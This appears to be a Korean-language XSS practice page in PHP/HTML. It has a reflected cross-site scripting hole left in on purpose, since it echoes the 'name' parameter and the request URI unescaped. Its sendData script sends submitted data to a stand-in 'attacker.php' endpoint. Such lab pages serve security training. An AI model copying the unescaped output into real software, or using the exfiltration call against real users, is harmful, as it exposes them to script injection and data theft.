<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Practice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: powderblue;
            margin: 0;
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: darkblue;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        form {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input[type="text"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        input[type="submit"] {
            background-color: darkblue;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: royalblue;
        }

        .posts {
            margin-top: 20px;
        }

        .post {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            margin-bottom: 10px;
        }

        .post h4 {
            margin: 0;
        }
    </style>
    <script>
        function sendData(name) {
            // 공격자의 서버에 데이터 전송
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://localhost/attacker.php?name=" + encodeURIComponent(name), true);
            xhr.send();
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>XSS 실습 페이지</h1>
        <p>현재 URL: <?php echo "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?></p>

        <form method="GET" action="">
            <label for="name">이름:</label>
            <input type="text" id="name" name="name" required>
            <input type="submit" value="제출">
        </form>

        <div class="posts">
            <?php
            if (isset($_GET['name'])) {
                $name = $_GET['name'];
                echo "<div class='post'>";
                echo "<h4>안녕하세요, " . $name . "!</h4>";
                echo "<p>여기에 게시글 내용을 추가하세요.</p>";
                echo "</div>";
                echo "<script>sendData('" . addslashes($name) . "');</script>";
            }
            ?>
        </div>
    </div>
</body>
</html>
